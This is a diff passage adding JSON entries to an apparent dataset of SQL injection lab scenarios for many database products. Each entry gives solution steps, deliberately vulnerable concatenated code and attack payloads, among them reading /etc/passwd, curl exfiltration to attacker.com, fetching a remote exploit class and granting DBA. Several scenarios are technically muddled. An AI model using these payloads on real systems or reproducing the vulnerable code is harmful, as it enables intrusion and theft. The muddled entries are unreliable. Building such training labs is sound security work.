+        {
+          "Lab scenario": "SQL Injection in TimescaleDB Continuous Aggregate Policies",
+          "Lab Description": "A time-series platform configures continuous aggregates with dynamic refresh policies. The policy parameters are concatenated directly into materialized view maintenance.",
+          "Difficulty Level": "Hard",
+          "Solution Steps": [
+            "Identify add_continuous_aggregate_policy",
+            "Inject through schedule parameters",
+            "Trigger materialization jobs",
+            "Bypass time bucket validation",
+            "Compromise hypertable data"
+          ],
+          "Vulnerability name": "Timescale Policy Injection",
+          "srcCode": "SELECT add_continuous_aggregate_policy('\\'' + userView + '\\'', '\\'' + userInterval + '\\'')",
+          "payloads": [
+            "my_view', INTERVAL '1 hour')) FROM _timescaledb_catalog.hypertable--",
+            "sensitive_view', INTERVAL '1 day'))) RETURNING *--"
+          ]
+        },
+        {
+          "Lab scenario": "SQL Injection in CockroachDB Changefeed Filters",
+          "Lab Description": "A CDC pipeline creates changefeeds with dynamic filter expressions. The filters are concatenated directly into change event generation.",
+          "Difficulty Level": "Medium",
+          "Solution Steps": [
+            "Identify changefeed creation",
+            "Inject through filter parameter",
+            "Trigger change events",
+            "Bypass CDC validation",
+            "Exfiltrate via webhook payloads"
+          ],
+          "Vulnerability name": "CockroachCDC Filter Injection",
+          "srcCode": "CREATE CHANGEFEED FOR TABLE users WITH filter = '\\'' + userFilter + '\\''",
+          "payloads": [
+            "SELECT * FROM users WHERE type = 'admin'--",
+            "SELECT *, (SELECT version()) FROM users--"
+          ]
+        },
+        {
+          "Lab scenario": "SQL Injection in DuckDB S3 Endpoint Configuration",
+          "Lab Description": "A data pipeline configures DuckDB's S3 extension with dynamic endpoints. The connection strings are concatenated directly into cloud storage operations.",
+          "Difficulty Level": "Medium",
+          "Solution Steps": [
+            "Identify S3 configuration points",
+            "Inject through endpoint parameters",
+            "Bypass URL validation",
+            "Modify remote data access",
+            "Exfiltrate credentials"
+          ],
+          "Vulnerability name": "DuckDB S3 Endpoint Injection",
+          "srcCode": "SET s3_endpoint='\\'' + userEndpoint + '\\''",
+          "payloads": [
+            "attacker.com') FROM (SELECT * FROM duckdb_settings)--",
+            "legit.s3.amazonaws.com'; COPY (SELECT * FROM sqlite_master) TO 's3://exfil/'--"
+          ]
+        },
+        {
+          "Lab scenario": "SQL Injection in Materialized View WITH NO DATA Clause",
+          "Lab Description": "A data warehouse creates materialized views with dynamic data loading options. The WITH DATA clauses are concatenated directly into view creation.",
+          "Difficulty Level": "Hard",
+          "Solution Steps": [
+            "Identify materialized view creation",
+            "Inject through WITH DATA parameter",
+            "Trigger view population",
+            "Bypass data validation",
+            "Modify view contents"
+          ],
+          "Vulnerability name": "Materialized View Data Clause Injection",
+          "srcCode": "CREATE MATERIALIZED VIEW mv AS SELECT * FROM source '\\'' + userDataOption + '\\''",
+          "payloads": [
+            "WITH NO DATA) FROM (SELECT * FROM pg_matviews) x--",
+            "WITH DATA) WHERE 1=0 UNION SELECT 1,2,3--"
+          ]
+        },
+        {
+          "Lab scenario": "SQL Injection in SQL Server Ledger View Options",
+          "Lab Description": "A blockchain application uses SQL Server Ledger with dynamic view parameters. The options are concatenated directly into ledger view creation.",
+          "Difficulty Level": "Hard",
+          "Solution Steps": [
+            "Identify ledger view creation",
+            "Inject through view options",
+            "Trigger ledger verification",
+            "Bypass blockchain validation",
+            "Modify historical records"
+          ],
+          "Vulnerability name": "SQL Ledger View Injection",
+          "srcCode": "CREATE LEDGER VIEW ledger_view WITH (LEDGER_VIEW = ON, '\\'' + userOptions + '\\'')",
+          "payloads": [
+            "VERIFICATION = ON) FROM (SELECT * FROM sys.database_principals) x--",
+            "TRANSACTION_ID_COLUMN = id) WHERE 1=0 UNION SELECT 1--"
+          ]
+        },
+        {
+          "Lab scenario": "SQL Injection in Google BigQuery Wildcard Table Patterns",
+          "Lab Description": "A data analytics tool uses BigQuery wildcard tables with dynamic patterns. The table patterns are concatenated directly into FROM clauses.",
+          "Difficulty Level": "Medium",
+          "Solution Steps": [
+            "Identify wildcard table usage",
+            "Inject through table pattern",
+            "Bypass pattern validation",
+            "Access unauthorized datasets",
+            "Exfiltrate via table expansion"
+          ],
+          "Vulnerability name": "BigQuery Wildcard Injection",
+          "srcCode": "SELECT * FROM `project.dataset.${userPattern}`",
+          "payloads": [
+            "table_*` FROM (SELECT * FROM `region-us`.INFORMATION_SCHEMA.SCHEMATA) x--",
+            "legit_table` WHERE _TABLE_SUFFIX = '') UNION SELECT 1,2,3--"
+          ]
+        },
+        {
+          "Lab scenario": "SQL Injection in Snowflake Session Parameter Defaults",
+          "Lab Description": "A configuration tool sets Snowflake session parameters with dynamic defaults. The default expressions are concatenated directly into session initialization.",
+          "Difficulty Level": "Hard",
+          "Solution Steps": [
+            "Identify session parameter settings",
+            "Inject through default value expressions",
+            "Trigger new session creation",
+            "Bypass parameter validation",
+            "Persist settings across queries"
+          ],
+          "Vulnerability name": "Snowflake Session Default Injection",
+          "srcCode": "ALTER SESSION SET '\\'' + userParam + '\\'' = '\\'' + userValue + '\\''",
+          "payloads": [
+            "TIMESTAMP_OUTPUT_FORMAT', 'YYYY-MM-DD HH24:MI:SS') FROM (SELECT * FROM information_schema.tables)--",
+            "QUERY_TAG', 'test'); SELECT * FROM account_usage.access_history--"
+          ]
+        },
+        {
+          "Lab scenario": "SQL Injection in Databricks SQL Warehouse Configurations",
+          "Lab Description": "A Databricks environment configures SQL warehouses with dynamic parameters. The configuration strings are concatenated directly into warehouse creation.",
+          "Difficulty Level": "Hard",
+          "Solution Steps": [
+            "Identify warehouse creation endpoints",
+            "Inject through config parameters",
+            "Trigger warehouse startup",
+            "Bypass config validation",
+            "Access metastore via driver nodes"
+          ],
+          "Vulnerability name": "Databricks Warehouse Config Injection",
+          "srcCode": "CREATE WAREHOUSE my_warehouse WITH '\\'' + userConfig + '\\''",
+          "payloads": [
+            "AUTO_STOP = 1200) FROM (SELECT * FROM system.metastore.tables)--",
+            "CLUSTER_SIZE = 'Small'); SELECT * FROM hive_metastore.default.secrets--"
+          ]
+        },
+        {
+          "Lab scenario": "SQL Injection in Trino Function Namespace Paths",
+          "Lab Description": "A Trino cluster creates functions with dynamic namespace paths. The namespace strings are concatenated directly into function registration.",
+          "Difficulty Level": "Medium",
+          "Solution Steps": [
+            "Identify function creation endpoints",
+            "Inject through namespace parameters",
+            "Trigger function execution",
+            "Bypass namespace validation",
+            "Access system functions"
+          ],
+          "Vulnerability name": "Trino Function Namespace Injection",
+          "srcCode": "CREATE FUNCTION '\\'' + userNamespace + '\\''.my_func() RETURNS STRING",
+          "payloads": [
+            "system', 'return 1') FROM (SELECT * FROM system.metadata.catalogs)--",
+            "pg_catalog', 'SELECT * FROM pg_user')--"
+          ]
+        },
+        {
+          "Lab scenario": "SQL Injection in Presto Table Function Arguments",
+          "Lab Description": "A Presto cluster uses table functions with dynamic arguments. The argument strings are concatenated directly into function calls.",
+          "Difficulty Level": "Hard",
+          "Solution Steps": [
+            "Identify table function usage",
+            "Inject through function arguments",
+            "Bypass argument validation",
+            "Modify generated table contents",
+            "Access system tables via function errors"
+          ],
+          "Vulnerability name": "Presto Table Function Injection",
+          "srcCode": "SELECT * FROM TABLE(system.query(query => '\\'' + userQuery + '\\''))",
+          "payloads": [
+            "SELECT 1')) FROM (SELECT * FROM system.runtime.nodes)--",
+            "SELECT * FROM tpch.sf1.customer')) WHERE 1=0 UNION SELECT 1,2,3--"
+          ]
+        },
+
+
+
+
+        
+
+        
+        
+            {
+              "Lab scenario": "SQL Injection in PostgreSQL COPY TO PROGRAM",
+              "Lab Description": "A data export feature uses COPY TO with dynamic program execution. The command strings are concatenated directly into shell command execution.",
+              "Difficulty Level": "Hard",
+              "Solution Steps": [
+                "Identify COPY TO PROGRAM usage",
+                "Inject through command parameter",
+                "Bypass shell metacharacter filtering",
+                "Execute OS commands",
+                "Exfiltrate via program output"
+              ],
+              "Vulnerability name": "PostgreSQL COPY Command Injection",
+              "srcCode": "COPY (SELECT * FROM table) TO PROGRAM '\\'' + userCommand + '\\''",
+              "payloads": [
+                "cat /etc/passwd > /tmp/leak",
+                "curl attacker.com/?exfil=$(ls | base64)"
+              ]
+            },
+            {
+              "Lab scenario": "SQL Injection in MySQL X Protocol Authentication",
+              "Lab Description": "A custom authentication plugin uses X Protocol with dynamic queries. The auth strings are concatenated directly into connection handshakes.",
+              "Difficulty Level": "Easy",
+              "Solution Steps": [
+                "Identify X Plugin authentication",
+                "Inject through auth attributes",
+                "Bypass protocol validation",
+                "Execute queries during handshake",
+                "Access server metadata"
+              ],
+              "Vulnerability name": "MySQL X Protocol Injection",
+              "srcCode": "mysqlx.getSession({auth: '\\'' + userAuth + '\\''})",
+              "payloads": [
+                "PLAIN\" }); SELECT * FROM mysql.user --",
+                "EXTERNAL\" }); SHOW DATABASES --"
+              ]
+            },
+            {
+              "Lab scenario": "SQL Injection in SQL Server External Script Parameters",
+              "Lab Description": "A machine learning service uses sp_execute_external_script with dynamic R/Python parameters. The script arguments are concatenated directly into execution.",
+              "Difficulty Level": "Hard",
+              "Solution Steps": [
+                "Identify external script usage",
+                "Inject through @params argument",
+                "Bypass language sandboxing",
+                "Execute arbitrary code",
+                "Access file system"
+              ],
+              "Vulnerability name": "SQL Server External Script Injection",
+              "srcCode": "EXEC sp_execute_external_script @language='R', @script='\\'' + userCode + '\\''",
+              "payloads": [
+                "system('whoami')",
+                "write.csv(list.files(), '/tmp/loot')"
+              ]
+            },
+            {
+              "Lab scenario": "SQL Injection in Oracle SDO_UTIL.TO_GEOJSON",
+              "Lab Description": "A GIS application converts geometries to GeoJSON with dynamic properties. The attribute lists are concatenated directly into JSON generation.",
+              "Difficulty Level": "Medium",
+              "Solution Steps": [
+                "Identify SDO_UTIL.TO_GEOJSON calls",
+                "Inject through properties parameter",
+                "Bypass JSON validation",
+                "Access spatial metadata",
+                "Exfiltrate via malformed GeoJSON"
+              ],
+              "Vulnerability name": "Oracle GeoJSON Injection",
+              "srcCode": "SDO_UTIL.TO_GEOJSON(geom, '\\'' + userProps + '\\'')",
+              "payloads": [
+                "'properties') FROM ALL_SDO_GEOM_METADATA --",
+                "'{\"a\":(SELECT * FROM ALL_USERS)'}"
+              ]
+            },
+            {
+              "Lab scenario": "SQL Injection in Snowflake External Table Refresh",
+              "Lab Description": "A cloud pipeline refreshes external tables with dynamic location patterns. The path strings are concatenated directly into metadata updates.",
+              "Difficulty Level": "Medium",
+              "Solution Steps": [
+                "Identify ALTER EXTERNAL TABLE",
+                "Inject through location parameters",
+                "Bypass path validation",
+                "Access unauthorized storage",
+                "Poison metadata cache"
+              ],
+              "Vulnerability name": "Snowflake External Table Poisoning",
+              "srcCode": "ALTER EXTERNAL TABLE ext_table REFRESH '\\'' + userPath + '\\''",
+              "payloads": [
+                "s3://legit/path') FROM INFORMATION_SCHEMA.EXTERNAL_TABLES --",
+                "s3://attacker/exfil')) LIST @~/staged"
+              ]
+            },
+            {
+              "Lab scenario": "SQL Injection in BigQuery JavaScript UDF Inline Code",
+              "Lab Description": "A data transformation uses JavaScript UDFs with dynamic code. The script bodies are concatenated directly into function execution.",
+              "Difficulty Level": "Hard",
+              "Solution Steps": [
+                "Identify CREATE TEMP FUNCTION usage",
+                "Inject through JavaScript code",
+                "Bypass sandbox restrictions",
+                "Access other query contexts",
+                "Execute arbitrary BigQuery SQL"
+              ],
+              "Vulnerability name": "BigQuery JS UDF Injection",
+              "srcCode": "CREATE TEMP FUNCTION my_func() RETURNS STRING LANGUAGE js AS '\\'' + userCode + '\\''",
+              "payloads": [
+                "`${BigQuery.execute('SELECT * FROM sensitive_data')}`",
+                "process.env.GCP_PROJECT"
+              ]
+            },
+            {
+              "Lab scenario": "SQL Injection in Azure Synapse Spark Notebook Parameters",
+              "Lab Description": "A Synapse Spark notebook accepts dynamic SQL parameters. The values are concatenated directly into PySpark/SQL cell execution.",
+              "Difficulty Level": "Medium",
+              "Solution Steps": [
+                "Identify notebook parameter usage",
+                "Inject through widget values",
+                "Bypass notebook sanitization",
+                "Access linked services",
+                "Execute cross-workspace queries"
+              ],
+              "Vulnerability name": "Synapse Notebook Injection",
+              "srcCode": "val query = \"SELECT * FROM table WHERE id = '\\'' + userParam + '\\''\"",
+              "payloads": [
+                "1' UNION SELECT * FROM sensitive_table --",
+                "' || (SELECT TOP 1 name FROM sys.sql_logins) || '"
+              ]
+            },
+            {
+              "Lab scenario": "SQL Injection in Amazon Redshift SUPER Type Casting",
+              "Lab Description": "A semi-structured data system uses dynamic casts to SUPER type. The type expressions are concatenated directly into JSON processing.",
+              "Difficulty Level": "Medium",
+              "Solution Steps": [
+                "Identify SUPER type usage",
+                "Inject through cast expressions",
+                "Bypass JSON validation",
+                "Access other columns",
+                "Exfiltrate via malformed JSON"
+              ],
+              "Vulnerability name": "Redshift SUPER Cast Injection",
+              "srcCode": "SELECT json_column::'\\'' + userType + '\\'' FROM table",
+              "payloads": [
+                "SUPER') FROM SVV_TABLE_INFO --",
+                "VARCHAR)) FROM (SELECT * FROM PG_USER)"
+              ]
+            },
+            {
+              "Lab scenario": "SQL Injection in Google Cloud Spanner DDL Change Streams",
+              "Lab Description": "A schema migration tool creates change streams with dynamic DDL filters. The filter strings are concatenated directly into schema change tracking.",
+              "Difficulty Level": "Hard",
+              "Solution Steps": [
+                "Identify CREATE CHANGE STREAM",
+                "Inject through DDL filter clauses",
+                "Bypass DDL validation",
+                "Access schema history",
+                "Tamper with change events"
+              ],
+              "Vulnerability name": "Spanner DDL Stream Injection",
+              "srcCode": "CREATE CHANGE STREAM stream FOR '\\'' + userDDL + '\\''",
+              "payloads": [
+                "ALL') FROM INFORMATION_SCHEMA.CHANGE_STREAMS --",
+                "CREATE_TABLE,ALTER_TABLE'))) SELECT * FROM SPANNER_SYS.TABLES@{}"
+              ]
+            },
+            {
+              "Lab scenario": "SQL Injection in Databricks Unity Catalog Table Comments",
+              "Lab Description": "A data governance system updates table comments dynamically. The comment text is concatenated directly into ALTER TABLE statements.",
+              "Difficulty Level": "Easy",
+              "Solution Steps": [
+                "Identify ALTER TABLE SET COMMENT",
+                "Inject through comment parameter",
+                "Bypass string sanitization",
+                "Execute embedded SQL",
+                "Access catalog metadata"
+              ],
+              "Vulnerability name": "Unity Catalog Comment Injection",
+              "srcCode": "ALTER TABLE table SET COMMENT '\\'' + userComment + '\\''",
+              "payloads": [
+                "Test comment') FROM system.information_schema.tables --",
+                "Legit comment'; SELECT * FROM hive_metastore.default.secrets --"
+              ]
+            },
+            {
+              "Lab scenario": "SQL Injection in Snowpark Python Stored Procedures",
+              "Lab Description": "A Snowflake Snowpark app creates Python UDFs with dynamic code. The Python source is concatenated directly into procedure creation.",
+              "Difficulty Level": "Hard",
+              "Solution Steps": [
+                "Identify CREATE PROCEDURE usage",
+                "Inject through Python code",
+                "Bypass sandbox restrictions",
+                "Access session state",
+                "Execute arbitrary SQL"
+              ],
+              "Vulnerability name": "Snowpark Python Injection",
+              "srcCode": "CREATE PROCEDURE my_proc() RETURNS STRING LANGUAGE PYTHON AS '\\'' + userCode + '\\''",
+              "payloads": [
+                "session.sql('SELECT * FROM sensitive_data').collect()",
+                "import os; os.system('curl attacker.com')"
+              ]
+            },
+            {
+              "Lab scenario": "SQL Injection in Azure Cosmos DB SQL API User-Defined Functions",
+              "Lab Description": "A NoSQL application creates UDFs with dynamic JavaScript. The function bodies are concatenated directly into query execution.",
+              "Difficulty Level": "Medium",
+              "Solution Steps": [
+                "Identify UDF creation",
+                "Inject through JavaScript code",
+                "Bypass scope limitations",
+                "Access other documents",
+                "Execute malicious queries"
+              ],
+              "Vulnerability name": "CosmosDB UDF Injection",
+              "srcCode": "function userDefinedFunction(\\'' + userParams + '\\'') { '\\'' + userBody + '\\'' }",
+              "payloads": [
+                "input) { return __.filter(function(doc) { return true }); }",
+                "doc) { return __.executeSql('SELECT * FROM c'); }"
+              ]
+            },
+            {
+              "Lab scenario": "SQL Injection in Elasticsearch SQL ODBC Driver Connection Strings",
+              "Lab Description": "An analytics tool builds ODBC connections with dynamic properties. The connection strings are concatenated directly into driver initialization.",
+              "Difficulty Level": "Medium",
+              "Solution Steps": [
+                "Identify ODBC connection points",
+                "Inject through connection properties",
+                "Bypass driver validation",
+                "Access restricted indices",
+                "Exfiltrate via driver errors"
+              ],
+              "Vulnerability name": "Elasticsearch ODBC Injection",
+              "srcCode": "Driver={{Elasticsearch ODBC}};Server='\\'' + userServer + '\\'';Properties='\\'' + userProps + '\\''",
+              "payloads": [
+                "attacker.com;UID=admin;PWD=' OR 1=1 --",
+                "legit.com:9200\";SSL=1;SSLCertAuth=0;"
+              ]
+            },
+            {
+              "Lab scenario": "SQL Injection in Apache Druid SQL Identifier Case Forcing",
+              "Lab Description": "A dashboard tool forces identifier case with dynamic expressions. The case operations are concatenated directly into query planning.",
+              "Difficulty Level": "Easy",
+              "Solution Steps": [
+                "Identify case manipulation",
+                "Inject through case expressions",
+                "Bypass parser validation",
+                "Access system tables",
+                "Execute native queries"
+              ],
+              "Vulnerability name": "Druid Case Forcing Injection",
+              "srcCode": "SELECT * FROM '\\'' + userTable + '\\''",
+              "payloads": [
+                "datasource FROM (SELECT * FROM sys.segments) --",
+                "SENSITIVE_DATA\" WHERE __time > 0) UNION SELECT 1 --"
+              ]
+            },
+            {
+              "Lab scenario": "SQL Injection in InfluxDB Flux HTTP Request Parameters",
+              "Lab Description": "A monitoring system builds Flux HTTP requests with dynamic URLs. The request parameters are concatenated directly into pipeline execution.",
+              "Difficulty Level": "Hard",
+              "Solution Steps": [
+                "Identify http.get/post calls",
+                "Inject through URL parameters",
+                "Bypass URL validation",
+                "Access internal endpoints",
+                "Exfiltrate via HTTP responses"
+              ],
+              "Vulnerability name": "Flux HTTP Injection",
+              "srcCode": "import \"http\" http.get(url: '\\'' + userUrl + '\\'')",
+              "payloads": [
+                "attacker.com/exfil?data=${string(v: r._value)}",
+                "localhost:8086/query?q=SHOW DATABASES"
+              ]
+            },
+            {
+              "Lab scenario": "SQL Injection in TimescaleDB Compression Segmentby Columns",
+              "Lab Description": "A time-series database enables compression with dynamic segmentby columns. The column lists are concatenated directly into compression policies.",
+              "Difficulty Level": "Medium",
+              "Solution Steps": [
+                "Identify ALTER TABLE SET compression",
+                "Inject through segmentby parameters",
+                "Bypass column validation",
+                "Access compressed chunks",
+                "Manipulate compression ratios"
+              ],
+              "Vulnerability name": "Timescale Compression Injection",
+              "srcCode": "ALTER TABLE hypertable SET (timescaledb.compress, timescaledb.compress_segmentby = '\\'' + userColumns + '\\'')",
+              "payloads": [
+                "device_id') FROM _timescaledb_catalog.hypertable --",
+                "time DESC')) WITH (compress_orderby = 'time DESC')"
+              ]
+            },
+            {
+              "Lab scenario": "SQL Injection in CockroachDB CDC Webhook Headers",
+              "Lab Description": "A change data capture system configures webhooks with dynamic headers. The header values are concatenated directly into HTTP requests.",
+              "Difficulty Level": "Hard",
+              "Solution Steps": [
+                "Identify CREATE CHANGEFEED WITH webhook",
+                "Inject through header parameters",
+                "Bypass header validation",
+                "Access webhook endpoints",
+                "Exfiltrate via custom headers"
+              ],
+              "Vulnerability name": "Cockroach Webhook Header Injection",
+              "srcCode": "CREATE CHANGEFEED FOR TABLE table INTO 'webhook-https://endpoint' WITH webhook_headers = '\\'' + userHeaders + '\\''",
+              "payloads": [
+                "'X-Auth: attacker'",
+                "'{\"Authorization\": \"Bearer $(curl attacker.com)\"}'"
+              ]
+            },
+            {
+              "Lab scenario": "SQL Injection in DuckDB HTTPFS Extension Headers",
+              "Lab Description": "A data pipeline uses DuckDB's HTTPFS with dynamic request headers. The header strings are concatenated directly into HTTP operations.",
+              "Difficulty Level": "Medium",
+              "Solution Steps": [
+                "Identify HTTPFS usage",
+                "Inject through header parameters",
+                "Bypass header validation",
+                "Access restricted URLs",
+                "Exfiltrate via server responses"
+              ],
+              "Vulnerability name": "DuckDB HTTPFS Header Injection",
+              "srcCode": "SET http_headers = '\\'' + userHeaders + '\\''",
+              "payloads": [
+                "'Authorization: Basic YWRtaW46cGFzcw=='",
+                "'X-Forwarded-For: 127.0.0.1'"
+              ]
+            },
+    
+            {
+              "Lab scenario": "SQL Injection in BigQuery Remote Model Connection Strings",
+              "Lab Description": "A machine learning system creates remote models with dynamic connections. The connection strings are concatenated directly into model inference.",
+              "Difficulty Level": "Easy",
+              "Solution Steps": [
+                "Identify CREATE MODEL usage",
+                "Inject through CONNECTION parameters",
+                "Bypass IAM validation",
+                "Access Vertex AI endpoints",
+                "Execute arbitrary predictions"
+              ],
+              "Vulnerability name": "BigQuery Model Connection Injection",
+              "srcCode": "CREATE MODEL `project.model` REMOTE WITH CONNECTION `\\'' + userConn + '\\''",
+              "payloads": [
+                "us.my-connection') FROM `region-us`.INFORMATION_SCHEMA.ROUTINES --",
+                "attacker-proj.us.conn` OPTIONS (endpoint='attacker.com')"
+              ]
+            },
+            {
+              "Lab scenario": "SQL Injection in Snowflake External Function Response Transformers",
+              "Lab Description": "A cloud integration processes external function responses with dynamic transformers. The JavaScript code is concatenated directly into result handling.",
+              "Difficulty Level": "Hard",
+              "Solution Steps": [
+                "Identify CREATE EXTERNAL FUNCTION",
+                "Inject through RESPONSE_TRANSFORMER",
+                "Bypass sandbox restrictions",
+                "Modify returned data",
+                "Execute arbitrary SQL"
+              ],
+              "Vulnerability name": "Snowflake Response Transformer Injection",
+              "srcCode": "CREATE EXTERNAL FUNCTION func() RETURNS VARIANT RESPONSE_TRANSFORMER = '\\'' + userTransformer + '\\''",
+              "payloads": [
+                "function transform(res) { return {sqlText: 'SELECT * FROM sensitive_table'}; }",
+                "res => res.map(row => ({...row, extra: execute('SHOW PARAMETERS')}))"
+              ]
+            },
+            {
+              "Lab scenario": "SQL Injection in Databricks Asset Bundle Runtime Parameters",
+              "Lab Description": "A deployment pipeline configures Databricks bundles with dynamic runtime args. The parameter strings are concatenated directly into job execution.",
+              "Difficulty Level": "Medium",
+              "Solution Steps": [
+                "Identify bundle.yml usage",
+                "Inject through runtime parameters",
+                "Bypass YAML validation",
+                "Access cluster environment",
+                "Execute arbitrary notebooks"
+              ],
+              "Vulnerability name": "Databricks Bundle Injection",
+              "srcCode": "resources: jobs: my_job: runtime_params: '\\'' + userParams + '\\''",
+              "payloads": [
+                "key:value') FROM system.bundles --",
+                "malicious: $(cat /etc/passwd)"
+              ]
+            },
+            {
+              "Lab scenario": "SQL Injection in Trino Iceberg Metadata Procedures",
+              "Lab Description": "A data lakehouse executes Iceberg procedures with dynamic arguments. The parameters are concatenated directly into metadata operations.",
+              "Difficulty Level": "Hard",
+              "Solution Steps": [
+                "Identify CALL iceberg.system usage",
+                "Inject through procedure arguments",
+                "Bypass namespace validation",
+                "Tamper with table metadata",
+                "Access underlying files"
+              ],
+              "Vulnerability name": "Trino Iceberg Procedure Injection",
+              "srcCode": "CALL iceberg.system.procedure('\\'' + userArgs + '\\'')",
+              "payloads": [
+                "snapshots') FROM iceberg.information_schema.tables --",
+                "expire_snapshots(table => 'sensitive'))"
+              ]
+            },
+            {
+              "Lab scenario": "SQL Injection in Presto Thrift UDF Payloads",
+              "Lab Description": "A distributed system registers Thrift UDFs with dynamic serialization. The payload strings are concatenated directly into function execution.",
+              "Difficulty Level": "Easy",
+              "Solution Steps": [
+                "Identify Thrift UDF registration",
+                "Inject through serialized payloads",
+                "Bypass deserialization checks",
+                "Execute arbitrary code",
+                "Access worker nodes"
+              ],
+              "Vulnerability name": "Presto Thrift UDF Injection",
+              "srcCode": "CREATE FUNCTION my_func RETURNS string TYPE thrift LANGUAGE thrift HANDLER '\\'' + userHandler + '\\''",
+              "payloads": [
+                "attacker.com:8080/Exploit.class",
+                "java -jar malicious.jar"
+              ]
+            },
+            {
+              "Lab scenario": "SQL Injection in ClickHouse Kafka Engine Settings",
+              "Lab Description": "A streaming pipeline creates Kafka tables with dynamic engine settings. The configuration strings are concatenated directly into consumer initialization.",
+              "Difficulty Level": "Medium",
+              "Solution Steps": [
+                "Identify CREATE TABLE ENGINE=Kafka",
+                "Inject through settings parameters",
+                "Bypass broker validation",
+                "Access unauthorized topics",
+                "Poison message streams"
+              ],
+              "Vulnerability name": "ClickHouse Kafka Injection",
+              "srcCode": "CREATE TABLE kafka_table ENGINE = Kafka('\\'' + userSettings + '\\'')",
+              "payloads": [
+                "attacker.com:9092') FROM system.kafka_tables --",
+                "legit:9092, topic=secret')) SETTINGS kafka_skip_broken_messages=1"
+              ]
+            },
+        
+
+
+
+
+
+            
+                {
+                  "Lab scenario": "SQL Injection in PostgreSQL CREATE TEXT SEARCH PARSER",
+                  "Lab Description": "A search engine dynamically creates text parsers with vulnerable configuration. The parser commands are concatenated directly into dictionary creation.",
+                  "Difficulty Level": "Hard",
+                  "Solution Steps": [
+                    "Identify CREATE TEXT SEARCH PARSER",
+                    "Inject through startup/lexize functions",
+                    "Bypass C function validation",
+                    "Execute arbitrary code",
+                    "Compromise search indexes"
+                  ],
+                  "Vulnerability name": "PostgreSQL Text Parser Injection",
+                  "srcCode": "CREATE TEXT SEARCH PARSER my_parser (START = '\\'' + userStartFunc + '\\'', LEXIZE = '\\'' + userLexizeFunc + '\\'')",
+                  "payloads": [
+                    "shell_exec,'/bin/sh') FROM pg_ts_parser--",
+                    "system,'curl attacker.com')--"
+                  ]
+                },
+                {
+                  "Lab scenario": "SQL Injection in MySQL MEMORY Table Index Comments",
+                  "Lab Description": "A caching system creates MEMORY tables with dynamic index comments. The comment text is concatenated directly into index creation.",
+                  "Difficulty Level": "Medium",
+                  "Solution Steps": [
+                    "Identify COMMENT clause in indexes",
+                    "Inject through index metadata",
+                    "Bypass comment length limits",
+                    "Store malicious payload in memory",
+                    "Trigger via table scans"
+                  ],
+                  "Vulnerability name": "MySQL MEMORY Table Injection",
+                  "srcCode": "CREATE TABLE cache (id INT, INDEX idx (id) COMMENT '\\'' + userComment + '\\'') ENGINE=MEMORY",
+                  "payloads": [
+                    "test') FROM information_schema.tables--",
+                    "'||(SELECT GROUP_CONCAT(user) FROM mysql.user)--"
+                  ]
+                },
+                {
+                  "Lab scenario": "SQL Injection in SQL Server Graph SHORTEST_PATH Node Filters",
+                  "Lab Description": "A recommendation engine builds graph queries with dynamic node properties. The property filters are concatenated directly into pathfinding.",
+                  "Difficulty Level": "Medium",
+                  "Solution Steps": [
+                    "Identify SHORTEST_PATH usage",
+                    "Inject through node property filters",
+                    "Bypass graph traversal limits",
+                    "Access unauthorized nodes",
+                    "Exfiltrate relationship data"
+                  ],
+                  "Vulnerability name": "SQL Graph Path Injection",
+                  "srcCode": "MATCH SHORTEST_PATH((n {prop: '\\'' + userFilter + '\\''})-[*]->(m))",
+                  "payloads": [
+                    "1' OR 1=1)--",
+                    "valid'}) WHERE EXISTS(SELECT * FROM sys.sql_logins)--"
+                  ]
+                },
+                {
+                  "Lab scenario": "SQL Injection in Oracle DBMS_AQADM Queue Tables",
+                  "Lab Description": "A messaging system creates AQ queues with dynamic queue tables. The table parameters are concatenated directly into queue creation.",
+                  "Difficulty Level": "Hard",
+                  "Solution Steps": [
+                    "Identify DBMS_AQADM.CREATE_QUEUE_TABLE",
+                    "Inject through queue_table parameter",
+                    "Bypass queue validation",
+                    "Access message payloads",
+                    "Tamper with queue storage"
+                  ],
+                  "Vulnerability name": "Oracle AQ Queue Injection",
+                  "srcCode": "BEGIN DBMS_AQADM.CREATE_QUEUE_TABLE('\\'' + userTable + '\\''); END;",
+                  "payloads": [
+                    "legit_queue') FROM all_queues--",
+                    "malicious_queue')); EXECUTE IMMEDIATE 'GRANT DBA TO attacker'--"
+                  ]
+                },
+                {
+                  "Lab scenario": "SQL Injection in Snowflake STREAMS Table Filters",
+                  "Lab Description": "A CDC pipeline creates streams with dynamic table filters. The filter conditions are concatenated directly into change tracking.",
+                  "Difficulty Level": "Medium",
+                  "Solution Steps": [
+                    "Identify CREATE STREAM usage",
+                    "Inject through filter expressions",
+                    "Bypass change validation",
+                    "Access unauthorized changes",
+                    "Exfiltrate via stream content"
+                  ],
+                  "Vulnerability name": "Snowflake Stream Filter Injection",
+                  "srcCode": "CREATE STREAM my_stream ON TABLE target_table WHERE ('\\'' + userFilter + '\\'')",
+                  "payloads": [
+                            "1=1) FROM information_schema.streams--",
+                            "id>0)) APPEND_ONLY=TRUE--"
+                  ]
+                },
+                {
+                  "Lab scenario": "SQL Injection in BigQuery JSON_EXTRACT Path Parameters",
+                  "Lab Description": "A JSON processing system extracts values with dynamic path expressions. The paths are concatenated directly into JSON parsing.",
+                  "Difficulty Level": "Easy",
+                  "Solution Steps": [
+                    "Identify JSON_EXTRACT usage",
+                    "Inject through path parameters",
+                    "Bypass JSON validation",
+                    "Access unauthorized fields",
+                    "Exfiltrate via malformed JSON"
+                  ],
+                  "Vulnerability name": "BigQuery JSON Path Injection",
+                  "srcCode": "SELECT JSON_EXTRACT(json_col, '\\'' + userPath + '\\'') FROM dataset.table",
+                  "payloads": [
+                    "$.private\") FROM `project.dataset.sensitive`--",
+                    "$[0]')) WHERE 1=0 UNION SELECT 1,2,3--"
+                  ]
+                },
+                {
+                  "Lab scenario": "SQL Injection in Azure Synapse CETAS Partition Clauses",
+                  "Lab Description": "A data export feature uses CETAS with dynamic partition keys. The partition expressions are concatenated directly into file writing.",
+                  "Difficulty Level": "Hard",
+                  "Solution Steps": [
+                    "Identify CREATE EXTERNAL TABLE AS",
+                    "Inject through PARTITION BY",
+                    "Bypass path validation",
+                    "Manipulate file output structure",
+                    "Exfiltrate via partition folders"
+                  ],
+                  "Vulnerability name": "Synapse CETAS Partition Injection",
+                  "srcCode": "CREATE EXTERNAL TABLE ext_data WITH (PARTITION ('\\'' + userPartition + '\\'')) AS SELECT * FROM source",
+                  "payloads": [
+                    "col1='value'') FROM sys.external_tables--",
